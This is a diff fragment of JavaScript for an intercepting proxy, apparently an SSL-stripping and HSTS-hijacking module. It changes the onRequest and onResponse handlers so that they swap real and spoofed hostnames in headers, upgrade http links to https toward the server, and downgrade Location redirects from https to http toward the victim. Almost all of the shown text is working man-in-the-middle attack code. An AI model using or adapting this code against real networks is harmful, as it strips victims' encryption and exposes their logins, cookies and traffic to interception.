@@ -193,25 +193,23 @@ function onRequest(req, res) {
 			req.Scheme = "ignore"
 		}
 	} else {
+		req_headers = req.Headers.split("\r\n")
 		// Patch spoofed hostnames in headers
-		for (var a = 0; a < res.Headers.length; a++) {
-			for (var b = 0; b < replacement_hosts.length; b++) {
-				regexp      = new RegExp( replacement_hosts[b].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "(.*?)"), "ig" )
-				replacement = "$1" + target_hosts[b].replace("*", "")
-				count = 0
-				while ( res.Headers[a].Value.match(regexp) ) {
-					res.SetHeader( res.Headers[a].Name, res.Headers[a].Value.replace(regexp, replacement) )
-					count += 1
-					if (count >= 20) { break }
-				}
+		for (var i = 0; i < replacement_hosts.length; i++) {
+			regexp      = new RegExp( replacement_hosts[i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "(.*?)"), "ig" )
+			replacement = "$1" + target_hosts[i].replace("*", "")
+			while ( req.Headers.match(regexp) ) {
+				req.Headers = req.Headers.replace(regexp, replacement)
 			}
 		}
 		// Patch SSL in headers
-		for (var a = 0; a < ssl_log.length; a++) {
-			for (var b = 0; b < req.Headers.length; b++) {
-				regexp      = new RegExp( "(.*?)http:\/\/" + ssl_log[a].replace(/\./g, "\\.").replace(/\-/g, "\\-"), "ig" )
-				replacement = "$1" + "https://" + ssl_log[a]
-				req.SetHeader( req.Headers[b].Name, req.Headers[b].Value.replace(regexp, replacement) )
+		for (var a = 0; a < req_headers.length; a++) {
+			for (var b = 0; b < ssl_log.length; b++) {
+				regexp      = new RegExp( "(.*?)http:\/\/" + ssl_log[b].replace(/\./g, "\\.").replace(/\-/g, "\\-"), "ig" )
+				replacement = "$1" + "https://" + ssl_log[b]
+				req_header_name  = req_headers[a].replace(/:.*/, "")
+				req_header_value = req_headers[a].replace(/.*?: /, "")
+				req.SetHeader( req_header_name, req_header_value.replace(regexp, replacement) )
 			}
 		}
 		// Patch spoofed hostname of request
@@ -272,16 +270,11 @@ function onResponse(req, res) {
 			res.SetHeader( "Location", location.replace(/https:\/\//, "http://") )
 		}
 		// Hijack headers
-		for (var a = 0; a < res.Headers.length; a++) {
-			for (var b = 0; b < target_hosts.length; b++) {
-				regexp      = new RegExp( target_hosts[b].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "(.*?)"), "ig" )
-				replacement = "$1" + replacement_hosts[b].replace("*", "")
-				count = 0
-				while ( res.Headers[a].Value.match(regexp) ) {
-					res.SetHeader( res.Headers[a].Name, res.Headers[a].Value.replace(regexp, replacement) )
-					count += 1
-					if (count >= 20) { break }
-				}
+		for (var i = 0; i < target_hosts.length; i++) {
+			regexp      = new RegExp( target_hosts[i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace("*", "(.*?)"), "ig" )
+			replacement = "$1" + replacement_hosts[i].replace("*", "")
+			while ( res.Headers.match(regexp) ) {
+				res.Headers = res.Headers.replace(regexp, replacement)
 			}
 		}
 		// Strip meta tag redirection
